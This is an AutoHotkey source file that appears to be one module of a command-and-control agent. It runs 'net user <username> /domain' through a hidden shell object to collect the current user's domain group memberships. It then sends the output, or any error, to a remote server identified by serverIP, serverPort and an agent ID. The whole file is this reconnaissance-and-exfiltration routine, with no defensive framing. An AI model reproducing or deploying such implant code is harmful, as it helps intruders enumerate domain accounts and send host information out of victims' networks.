; ============================================================================
; ACTIVE USER MEMBERSHIP MODULE
; ============================================================================
; Gets group membership for the current user
; ============================================================================

ActiveUserMembership() {
    comspec := EnvGet("ComSpec")
    username := EnvGet("USERNAME")

    try {
        ; Execute the user membership query and capture output
        shell := ComObject("WScript.Shell")
        exec := shell.Exec(comspec . " /c net user " . username . " /domain")
        output := exec.StdOut.ReadAll()

        ; Format the data with header
        data := "Membership information for " . username . ":`n"
        data .= "----------------------------------------`n"
        data .= output

        ; Send results to server
        message := Format("command_output|{}|{}", this.agentID, data)
        response := this.SendMsg(this.serverIP, this.serverPort, message)

    } catch Error as err {
        errorMsg := "Error retrieving user membership information: " . err.Message
        message := Format("command_output|{}|{}", this.agentID, errorMsg)
        response := this.SendMsg(this.serverIP, this.serverPort, message)
    }
}
